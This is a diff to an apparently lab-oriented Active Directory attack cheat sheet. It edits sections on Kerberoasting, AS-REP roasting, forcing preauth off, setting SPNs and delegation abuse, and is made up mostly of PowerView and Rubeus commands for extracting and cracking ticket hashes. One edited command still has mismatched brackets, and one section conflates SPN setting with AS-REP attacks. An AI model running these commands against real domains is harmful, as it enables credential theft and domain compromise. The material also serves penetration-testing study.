@@ -25,8 +25,9 @@
 
 ### Kerberoasting
 ---
-```powershell
+Any domain user can request copies of all service accounts with their password hashes. This way a TGS can be requested for any SPN bound to a user for later cracking user password offline. 
 - PowerView:
+```powershell
 # Standard AD User. Get Domain Users SPN. Users that are for services
 C:> . .\PowerView.ps1
 C:> Get-DomainUser -SPN
@@ -57,6 +58,9 @@ C:> Rubeus.exe kerberoast /user:<user> /simple /outfile:hashes.txt
 C:> Rubeus.exe kerberoast /stats /rc4opsec
 C:> Rubeus.exe kerberoast /user:<user> /simple /rc4opsec
 
+# Accounts supporting only AES for Domain
+C:> Rubeus.exe kerberoast /outfile:<fileName> /domain:<domain> /aes
+
 # Specifying the authentication credentials 
 C:> Rubeus.exe kerberoast /outfile:<fileName> /domain:<domain> /creduser:<user> /credpassword:<pass>
 
@@ -82,7 +86,7 @@ C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>
 ```
 ### Targeted Kerberoasting AS-REPs
 ---
-For a domain user with kerberos preauthentication disabled, a valid TGT for this account can be requested without even having domain credentials. Then bruteforce the encripted passwd in the TGT.
+For a domain user with kerberos preauthentication disabled, a valid TGT for the account can be requested without even having domain credentials. Then bruteforce the encripted passwd in the TGT.
 #### Enumerating accounts with Kerberos Preauth disabled
 ```powershell
 # PowerView
@@ -93,7 +97,7 @@ C:> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequ
 ```
 #### Disable Kerberos Preauth
 ```powershell
-# Deisable it
+# Disable it
 C:> Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Verbose
 
 # Check again
@@ -101,7 +105,7 @@ C:> Get-DomainUser -PreauthNotRequired -Verbose
 ``` 
 #### ASREPRoast 
 ```powershell
-# Enumerate Users with KErberos preauth disabled
+# Enumerate Users with Kerberos preauth disabled
 C:> Invoke-ASREPRoast -Verbose
 
 # Request Encrypted AS-REP for Offline Brute Force
@@ -125,8 +129,8 @@ Rubeus.exe asreproast /ou:<OU_name> /format:<john or hashcat> /domain:<domain> /
 ---
 With rights over a user, we can set a SPN to it, and then go for a AS-REPs attack.
 ```powershell
-# Enumerate permissions for RDPUsers
-C:> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+# Enumerate permissions for <group>
+C:> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<group>"}
 
 # Check if user already has a SPN
 C:> Get-DomainUser -Identity <user> | select serviceprincipalname
@@ -181,6 +185,7 @@ C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
 # From here, a DC-Sync attack to DC to get krbtgt and also to enterprise DC.
 ```
 ### Constrained Delegation
+With have GenericALL/GenericWrite privileges on a machine account object of a domain, it can be abused, and then impersonate ourselves as any user of the domain to the machine.
 ```powershell
 # Get users with Constraied delegation
 C:> . .\PowerView.ps1
@@ -209,7 +214,7 @@ With required privileges on a computer object, it can be abused and impersonate 
 # Use BloodHound to get Users permissions over hosts for clues
 
 # Then check potential users with following command
-C:> Find-InterestingDomainACL | ?{$_.identityreferencename | -match '<user>'
+C:> Find-InterestingDomainACL | ?{$_.identityreferencename | -match '<user>')
 #   ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
 #   ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
 #   SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1109
